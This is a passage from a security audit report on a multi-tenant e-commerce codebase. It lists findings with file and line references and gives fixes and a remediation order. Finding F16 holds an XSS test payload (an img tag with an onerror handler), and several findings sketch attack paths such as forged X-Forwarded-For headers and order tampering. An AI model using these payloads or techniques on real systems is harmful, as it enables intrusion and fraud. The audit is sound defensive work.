- **Unbounded memory.** `RateLimiter._hits` is a `defaultdict(deque)` (`:16`). The window `popleft()`s stale timestamps (`:23-24`) but **never deletes the key**. Every distinct or forged XFF value adds a permanent dict entry. Combined with the spoofable key, this is a memory-exhaustion primitive against the API process. `_IPFailTracker._buckets` (`auth.py:44`) has the same never-evicted growth.
- **GETs are entirely exempt.** `api/main.py:110`: `if request.method != "GET":`. Every enumeration endpoint in F9, plus `/products/graph` returning 4000 nodes, plus `/healthz/details` (which triggers an LLM ping), is unthrottled.

On Vercel both structures live per-function-instance and reset on cold start, so in the deployment that is actually internet-reachable, mutation rate-limiting and IP login throttling are **effectively absent** — while F2 (free orders) and F8 (known credential) both live on that same deployment.

**Fix.**
1. Only honour `X-Forwarded-For` when `request.client.host` is in a configured `TRUSTED_PROXIES` CIDR list; otherwise use the socket peer. Add `trusted_proxies: str = ""` to `config.py`.
2. Evict empty deques: `if not q: del self._hits[key]` after the drain loop, plus a periodic sweep. Cap the dict size and fail-closed (429) when it is exceeded.
3. Rate-limit expensive GETs too — at minimum `/products`, `/products/graph`, `/healthz/details`.
4. Move both structures to Postgres or Redis so they survive cold starts and are shared across replicas. On the Vercel path, a DB-backed counter is the only thing that works at all.
5. Mitigate the lockout DoS: switch from a hard 15-minute lock to exponential backoff *per (account, IP)*, and never let an unauthenticated caller push a known-good account into a locked state indefinitely.

---

### F11 — MEDIUM — No Content-Security-Policy (the docs claim there is one)

**CONFIRMED.** `api/main.py:144-148` sets exactly four response headers:
```python
response.headers["x-content-type-options"] = "nosniff"
response.headers["x-frame-options"] = "DENY"
response.headers["referrer-policy"] = "strict-origin-when-cross-origin"
response.headers["strict-transport-security"] = "max-age=31536000; includeSubDomains"
```
`CLAUDE.md §5` states the middleware sets *"security headers (CSP/X-Frame/HSTS)"*. **There is no CSP.** A repo-wide grep for `content-security-policy` / `Content-Security-Policy` returns zero hits in any Python, TS, or HTML file.

Missing alongside it: `Permissions-Policy`, and `frame-ancestors` (X-Frame-Options `DENY` is honoured by current browsers but `frame-ancestors` is the standards-track control).

The storefront is served from Vercel's static CDN, so a CSP for the HTML shell belongs in `vercel.json` headers, not only on the API. `vercel.json` currently declares no `headers` block at all.

**Impact.** On its own this is defence-in-depth. It matters because (a) the admin stores its JWT in `localStorage` (`admin/src/lib/api.ts:9`) where any script can read it, (b) product `description` and `specs` are written by an LLM from scraped third-party pages (`full_intel.py:243`) — untrusted content flowing into the admin UI — and (c) F16 shows the team does reach for `innerHTML`. React escapes by default and I found **no `dangerouslySetInnerHTML` in `storefront/src` or `admin/src`** (grep: zero hits), so there is no live XSS in the React apps today. CSP is the thing that limits the blast radius when one appears.

**Fix.** Add to the `main.py` header block:
```python
response.headers["content-security-policy"] = (
    "default-src 'self'; img-src 'self' https: data:; "
    "script-src 'self'; style-src 'self' 'unsafe-inline'; "
    "connect-src 'self'; frame-ancestors 'none'; base-uri 'self'; object-src 'none'"
)
response.headers["permissions-policy"] = "geolocation=(), microphone=(), camera=()"
```
and mirror it as a `headers` entry in `vercel.json` for the static storefront. Note `img-src https:` is required — approved product images point at arbitrary retailer CDNs (`full_intel.py:304`).

---

### F12 — MEDIUM — No token revocation, no logout, no password-change endpoint

**CONFIRMED.**

- The JWT payload (`security.py:32-38`) is `{sub, role, iat, exp, type}` plus `{email, store_id}`. **There is no `jti`**, and no denylist table exists.
- `get_current_admin` (`:67-83`) does **no database lookup** — it never checks `is_active`, never re-reads `role`, never re-reads `store_id`.
- "Logout" is `localStorage.removeItem('gl_token')` (`admin/src/lib/auth.tsx:49`) — purely client-side.
- There is **no password-change endpoint** anywhere in `api/routes/`. Rotation is documented as raw SQL (`DEPLOY.md:180-184`).

**Consequences.** Deactivating an operator (`is_active = false`), demoting them, re-assigning their store, or rotating their password **has no effect on their existing token** for up to `jwt_access_ttl_minutes = 60` (`config.py:41`). A fired employee keeps `SUPER_ADMIN` for an hour. An exfiltrated token cannot be killed. Combined with F4 (everyone is a platform operator) and F7 (forgeable secret), there is no break-glass.

`jwt_refresh_ttl_days: int = 14` exists in config (`:42`) but **no refresh-token flow is implemented** — grep for `refresh` in `api/` returns only the config line. Dead setting.

**Fix.**
1. Add `jti` (a UUID) to the token and a `revoked_tokens(jti, expires_at)` table; check it in `get_current_admin`. Prune on `expires_at`.
2. Cheaper alternative that covers most of it: add `admin_users.token_epoch INTEGER` (or reuse `password_changed_at`), embed it in the token, and reject tokens whose epoch is stale. Bumping the column instantly invalidates every outstanding token for that user — password change, deactivation and store re-assignment all bump it.
3. Add `POST /auth/logout` (revokes the presented `jti`) and `POST /auth/password` (verify current → set new → bump epoch).
4. Have `get_current_admin` verify `is_active` — a one-row lookup per request is cheap next to the queries every handler already runs, and it closes the deactivation gap without any token surgery.

---

### F13 — MEDIUM — `GET /events/{event_id}` reads any store's events

**CONFIRMED.** `api/routes/events.py:58-77`:
```python
@router.get("/{event_id}", dependencies=[Depends(require_role("SUPER_ADMIN", "ADMIN"))])
async def get_event(event_id: str, db: AsyncSession = Depends(get_db)):
    ... FROM events WHERE event_id = :id
```
No store predicate — even though the POST sibling directly above it (`:16-55`) correctly uses `require_admin_store_for` and was one of the four recently-fixed `store_id` bugs. The fix was applied to the write and not the read.

`event_id` is **caller-supplied** on ingest (`schemas.py:168`, `events.py:44`), so any brand's integration that uses derivable ids (order UUID, invoice number) is enumerable. For `emit_event`-generated events it is `uuid4()` (`services/events.py:40`) and effectively unguessable — but F5 hands you the ids anyway via `GET /jobs`.

Returned: `event_type`, `entity_type`, `entity_id`, `status`, `retry_count`, `last_error`, timestamps. `last_error` is raw exception text, which routinely carries SQL fragments and identifiers.

**Fix.** Add `store: Store = Depends(require_admin_store_for(require_role("SUPER_ADMIN","ADMIN")))` and `AND store_id = :sid` to the WHERE. Return the same 404 shape whether the row is absent or foreign — `products.py:199-202` already models this correctly ("A product belonging to another store is a 404, not a 403").

---

### F14 — MEDIUM — `.env` is not excluded from the Vercel deployment bundle

**CONFIRMED for the omission; SUSPECTED for the runtime consequence** (I did not run a deploy).

`.vercelignore` excludes `admin/`, `workers/`, `tests/`, `docker/`, `monitoring/`, `gaming-store/`, `docs/`, `scripts/`, `db/`, `.git/`, `.obsidian/`, `.claude/`, compose files, and `*.md`. **`.env` is not listed.**

`api/core/config.py:7`: `SettingsConfigDict(env_file=".env", ...)`. Pydantic-settings resolves `.env` relative to the process CWD, so whether the file is read at runtime depends on Vercel's function CWD — hence SUSPECTED. What is **certain** is that deploying with the Vercel CLI from the repo root uploads the local `.env` into the function bundle unless ignored, putting `DATABASE_URL`, `JWT_SECRET` and R2 credentials into a build artifact that never needed them.

Precedence note: real environment variables outperform `.env` values in pydantic-settings, so vars set in the Vercel dashboard win. The risk is (a) a var the operator *forgot* to set in Vercel silently falling back to the dev `.env` value — which for `JWT_SECRET` is the committed placeholder (F7) — and (b) secrets sitting in a deployment artifact.

**Fix.** Add `.env` and `.env.*` (with a `!.env.example` negation if you want the sample shipped) to `.vercelignore`. Independently, consider `env_file=None` when `os.getenv("VERCEL")` is set, so the serverless runtime can only ever read real environment variables.

---

### F15 — LOW-MEDIUM — Unvalidated enum-typed query parameters reach Postgres

**CONFIRMED by reading; runtime behaviour SUSPECTED** (not executed).

Several endpoints bind a free-text query parameter directly against a Postgres `ENUM` column:

| Site | Parameter | Column type |
|---|---|---|
| `products.py:91` | `?status=` (public, no auth) | `product_status_enum` |
| `catalog.py:129` | `?only_status=` (public, no auth) | `product_status_enum` |
| `orders.py:80` | `?status=` | `order_status_enum` |
| `jobs.py:177` | `?status=` | three different enums via the UNION |
| `enrichment.py:61,128` | `only_status` | `product_status_enum` |

Passing a value that is not a member of the enum makes Postgres raise `invalid input value for enum …`, which surfaces as an unhandled `DBAPIError` → the catch-all at `main.py:126-135` → **HTTP 500**. Contrast `images.py:60-65`, which validates against an `_ALLOWED_STATUS` set and returns a clean 400, and `issues.py:197-199`, which whitelists via `_ISSUE_WHERE_FRAGMENTS` — both correct patterns already in the codebase.

**Impact.** An anonymous caller generates 500s at will on the two public endpoints. That is log noise, a false-alarm generator for any alerting you add, and — because the exception path also rolls back the session (`db.py:48-50`) — an unnecessary connection churn under a NullPool serverless configuration. Not a data exposure; the error body is the generic `{"error":"internal_error","request_id":…}`.

**Fix.** Type the parameters as `Literal[...]` (Pydantic then returns a clean 422) or validate against an explicit set the way `images.py` does. `ProductPatch.status` (`schemas.py:49`) already uses the correct `Literal[...]` form — copy it.

---

### F16 — LOW — DOM XSS sink in the `gaming-store` search overlay

**CONFIRMED.** `gaming-store/assets/js/app.js:305-306`:
```js
+ `<div class="search-empty"><a href="shop.html?q=${encodeURIComponent(input.value)}">See all results for “${input.value}” →</a></div>`
: `<div class="search-empty">No matches for “${input.value}”. Try “headset”…</div>`;
```
assigned to `out.innerHTML` (`:298`). `input.value` is interpolated **unescaped**. Typing `<img src=x onerror=alert(1)>` executes.

**Why it is Low, not High:** this is **self-XSS**. I checked the obvious escalation — the `?q=` URL parameter — and it is safe: `renderShop` reads `param('q')` (`:444`) and writes it via `textContent` (`:449`), never `innerHTML`. `param('cat')` feeds a `Set` used only for `.has()` checks; the `#filterCats` markup is built from the hardcoded `PRODUCTS` array (`:448`). So there is no reflected vector, and `gaming-store/` makes zero API calls (confirmed in `Architecture.md §2.1`) — there is no session to steal.

It is still a live sink in a codebase where the same file assigns `innerHTML` in ~25 places (`:226,227,296,298,322,348,357,364,381,384,399,419,425,427,436,448,466,487,519,576,589,635,653,677,725,755,767`). The moment `gaming-store/` gains a backend (`CLAUDE.md §9.8` treats this as an open question), every one of those becomes a server-data sink.

**Fix.** Escape before interpolation:
```js
const esc = (s) => String(s).replace(/[&<>"']/g, c =>
  ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
```
and use `esc(input.value)` in both branches. If `gaming-store/` is ever wired to the API, convert the whole file to `textContent` + `createElement` for anything derived from data.

---

### F17 — LOW — Docker Compose exposure and default database password

**CONFIRMED.** `docker-compose.yml`:
- `:41-42` — the API publishes `"8000:8000"`, i.e. **all interfaces**. `db` (`:14-15`) and `searxng` (`:99-100`) are correctly bound to `127.0.0.1`. So the dev API — with the seeded `brveadmin` credential (F8) and `/docs` enabled because `ENVIRONMENT=development` (`main.py:77`) — is reachable from anyone on the same LAN, coffee-shop Wi-Fi included.
- `:37` — `--reload` with `./api:/app/api:ro` mounted. Development-appropriate, but the file carries no "this is the dev compose" marker and `:29` only warns about the volume mounts, not the bind or the reloader.
- `:7` — `POSTGRES_PASSWORD: ${POSTGRES_PASSWORD:-glstore}`. If `.env` is missing, Postgres comes up with the password `glstore`.

**Fix.** Bind the API to `127.0.0.1:8000:8000` in the default compose; put the `0.0.0.0` bind and `--reload` in a `docker-compose.override.yml` that a developer opts into. Drop the `:-glstore` fallback so a missing `POSTGRES_PASSWORD` fails loudly.

---

## 5. F18 — SQL injection: none found (with the proof)

Every query in this codebase is raw `sqlalchemy.text()` — there is no ORM to protect you — so I enumerated **every** f-string that reaches `text()` and checked each interpolated variable's provenance. All 24 sites are safe.

| Site | Interpolant | Provenance | Verdict |
|---|---|---|---|
| `products.py:49` | `{table}`, `{field}` | call-site string literals only (`"products"/"sku"`, `"products"/"slug"`, `"offers"/"variant_sku"` at `:266,267,328,330,404,477`) | safe |
| `products.py:127,164` | `{where_sql}`, `{extra_where_sql}`, `{order_clause}` | `where` list built from module literals; `order_clause` from the `_SORT_CLAUSES` whitelist dict with a default (`:111`) | safe |
| `products.py:345,493` | `', '.join(set_parts)` | keys come from `dto.model_dump(exclude_unset=True)` on a Pydantic model — the key set is the declared field names, unforgeable | safe |
| `catalog.py:134,144,157,203` | `{where_status_unqualified}`, `{where_status_p}` | two module-level literal strings, chosen by an `if` (`:128-131`); the user value goes to the `:statuses` bind | safe |
| `images.py:67` | `{where}` | literals + `_ALLOWED_STATUS` set check (`:62-63`); the value itself is bound | safe |
| `issues.py:100,204,227` | `{where}`, `{fragment}` | `fragment` from the `_ISSUE_WHERE_FRAGMENTS` dict with a 400 on miss (`:197-199`) | safe |
| `jobs.py:184,210` | `{union_sql}`, `{where_sql}` | both assembled purely from literals (`:120-167,175-182`); `st`/`q` are binds | safe |
| `orders.py:86,106` | `{where_sql}` | literals only; `status_filter` is bound (`:81`) | safe |
| `scraper.py:224` | `{where_sql}` | literals; `domain` is bound (`:220-221`) | safe |
| `intel.py:152` | `{where_sql}` | literals; ids/statuses are binds (`:129-142`) | safe (but see F3 — the *missing* clause is the bug) |
| `stores.py:60,66,89` | `{_STORE_COLS}` | module constant (`:32-35`) | safe |
| `services/orders.py:295` | `{where}` | ternary over two literals (`:289`) | safe |
| `services/enrichment_runner.py:252` | `{store_filter}` | ternary over `" AND store_id = :sid"` / `""` (`:248`) | safe |
| `services/full_intel.py:243` | `', '.join(set_clauses)` | fixed literals appended conditionally (`:215-236`); LLM output goes to binds `:b/:c/:m/:desc` | safe from injection |
| `products_export.py:104,258,344` | `{where}`, `{set_clauses}`, `{conditions}` | literals; `new_status` validated against `_VALID_STATUSES` (`:320`) | safe (unmounted anyway) |
| `store_context.py:141,161,228` | `_STORE_SELECT` | module constant (`:104-108`) | safe |

Named binds are used **everywhere** a user value appears. Notably, LLM-generated content — the most obviously untrusted input in the system — is bound, not interpolated (`full_intel.py:243` params, `:326` `url[:2000]`).

**This is a genuinely good result** for a raw-SQL codebase and worth protecting. The convention to keep: *the only thing that may ever be interpolated into a `text()` string is a value that came from a module-level constant, a whitelist dict, or a Pydantic field name.* Consider adding a lint rule or a CI grep that flags any `text(f"` whose f-string references a name not in an approved allowlist.

---

## 6. Also checked — clean, or already covered elsewhere

| Area | Result |
|---|---|
| **XSS in React apps** | Zero `dangerouslySetInnerHTML` / `innerHTML` / `eval` in `storefront/src` or `admin/src`. React auto-escaping is intact. |
| **CSS/theme injection** | Closed. `settings.py:206-269` whitelists 32 tokens, applies per-kind regexes (`_COLOR_RE`, `_FONT_RE` explicitly excludes `url()`/`expression()`), enforces numeric bounds, and truncates. Rejections are reported without echoing the payload beyond 60 chars (`:242`). Well done. |
| **CORS** | `main.py:83-89` reads `cors_origins` from env (default `http://localhost:5173`) with `allow_credentials=True`. If anyone ever sets `CORS_ORIGINS=*`, Starlette will reflect the request Origin **and** allow credentials — a full cross-origin read. Not the case today; `DEPLOY.md:101` documents an explicit origin. Worth a `config.py` validator that rejects `*` when `allow_credentials` is on. Note the admin uses a Bearer token, not cookies, so the immediate CSRF exposure is limited. |
| **CSRF** | Not applicable to the admin — auth is `Authorization: Bearer` from `localStorage` (`admin/src/lib/api.ts:36-38`), never a cookie, so a cross-site form POST carries no credential. The public order endpoint has no session to ride. **F2 is the real "forged request" problem**, and it needs no CSRF at all. |
| **Password hashing** | Correct: bcrypt, `rounds=12` (`config.py:43`), `gensalt` per hash, `checkpw` with a `ValueError` guard (`security.py:16-27`). |
| **JWT algorithm** | Correct: single-element `algorithms=[...]` allowlist (`security.py:46`) — `alg:none` and HS/RS confusion are both closed. |
| **Login user-enumeration** | Correct: identical 401 for unknown email and wrong password (`auth.py:127-129,152`). Timing differs (bcrypt only runs on a real user) but that is a minor oracle. |
| **Order tracking enumeration** | Correct: `public_orders.py:121-125` uses a single shared `_NOT_FOUND` and requires both `order_number` and matching `phone_normalized`, store-scoped (`:153-155`). |
| **Migration integrity** | Good: SHA-256 checksum tamper detection that refuses to boot on a mismatch (`migrations.py:307-314`), advisory-locked to survive multi-replica (`:176-184`). The parallel copies of 001-004 inlined in `db/schema.sql` are **not** checksum-protected — see `Architecture.md §7.9`. |
| **File upload** | `products_import.py:41-48` caps at 16 MiB and decodes defensively. CSV content flows into bound parameters. No path traversal — nothing is written to disk. |
| **Dependency risk** | `requirements.txt` fully pins 17 packages. Versions are ~mid-2024 vintage (`fastapi==0.115.0`, `pyjwt==2.9.0`, `bcrypt==4.2.0`, `lxml==5.3.0`, `playwright==1.48.0`). Nothing is unpinned or wildcarded, which is the important part. **I did not run a CVE database check** — no network vulnerability feed was consulted, so I make no claim about known advisories. Recommend adding `pip-audit` and `npm audit` to CI; `storefront/` and `admin/` ship lockfiles, so both are checkable. |
| **`products_export.py`** | Already proven dead in `Architecture.md §7.7`. Confirmed independently: absent from `main.py:19`, zero Python imports repo-wide, zero frontend references. Its two `INSERT INTO observations` without `store_id` (`:278,:359`) are the same bug class as the four already fixed — dormant only because the router is unmounted. **Delete the file** rather than mounting it; if you mount it, it also inherits F3-class unscoped writes (`:261` `WHERE id = ANY(...)` with no store predicate). |
| **Test coverage of security** | Zero tests import `api.main` or `api.routes.*` (`Architecture.md §7.5`). **No test exercises authentication, role checks, or store scoping.** F2, F3, F5 and F13 would all be caught by a single `httpx.ASGITransport` test that logs in as store A and asserts a 404 against a store-B resource. This is the highest-leverage remediation in the whole report — see §7. |

---

## 7. Remediation order

Do them in this sequence — each one closes the door the next depends on.

**Today**
1. **F1** — regenerate the Obsidian API key and cert; `git rm -r --cached .obsidian/`; add to `.gitignore`.
2. **F2** — drop `discount_amount` / `shipping_cost` from `OrderCreate`; compute server-side. This is one file and roughly ten lines.
3. **F8** — change `seed_admin.sql` to `ON CONFLICT DO NOTHING`, remove the plaintext password comment, rotate the credential, move rotation to a numbered step before deploy in `DEPLOY.md`.
4. **F7** — add the `JWT_SECRET` placeholder/length validator to `config.py`. Fail closed.

**This week**
5. **F3** — lift `_assert_product_in_store` into `store_context.py`; apply `require_admin_store_for` to all 14 `intel.py` + `scraper.py` endpoints; make `store_id` the first clause in the intel-bulk WHERE.
6. **F5** — same treatment for the 9 `jobs.py` endpoints; tighten retry to non-terminal states.
7. **F4** — add `store_id` to `create_admin.py`; ship a `SUPER_ADMIN`-only user-management route; reject platform-operator `OPERATOR`/`VIEWER` accounts.
8. **Write the first route test.** One `httpx.ASGITransport` fixture, one store-A/store-B pair, and an assertion loop over every mounted endpoint that a store-B id returns 404. That single test file would have caught F3, F5, F13, all four already-fixed `store_id` bugs, and both dormant ones in `products_export.py`. It is the structural fix; everything above is a point patch.

**This month**
9. **F6** — move theme to `stores.theme`; gate LLM/scraper config behind a true platform operator; validate outbound endpoints against an SSRF allowlist; make an endpoint change invalidate the stored key.
10. **F9** — server-pin `status='ACTIVE'` for unauthenticated callers; remove `purchase_price` from public responses; move `/products/graph` behind auth.
11. **F12** — token epoch or `jti` denylist; `POST /auth/logout`; `POST /auth/password`.
12. **F10, F11, F13, F14, F15, F16, F17** — the remaining hardening.

---

## 8. What surprised me

1. **The tenancy boundary is correctly built and correctly applied in 10 of 17 modules — and then completely absent from 3.** This isn't a system that doesn't understand multi-tenancy; it's a system that understands it and stopped applying it three files short. `enrichment.py:31-38` is the fix, already written, sitting in the repo.
2. **F4 makes the whole model moot today.** I went looking for a subtle bypass of `require_admin_store_for` and found instead that its enforcement branch is unreachable: `store_id` is never set on any account, because nothing in the codebase can set it. The tenancy check is real code that has never once evaluated to `True`.
3. **A customer sets their own price.** In a COD business, `discount_amount` on an unauthenticated endpoint is not an authorization bug — it is the entire loss, one `curl` away, with no login and no trace.
4. **The most dangerous secret in the repo has nothing to do with GLstore.** A vault-management plugin's API key and RSA private key were swept into the initial commit alongside 99 other `.obsidian/` files, and `DEPLOY.md` instructs the owner to push this repo to GitHub.
5. **SQL injection — the thing you'd most expect in 4,400 lines of hand-written raw SQL — is genuinely clean.** All 24 f-string sites interpolate only literals, whitelist lookups, or Pydantic field names. That discipline is the codebase's best security property and deserves a lint rule to keep it.

---

*Prepared by the security audit, 2026-07-31. Read-only: no source file was modified, staged, or committed.*
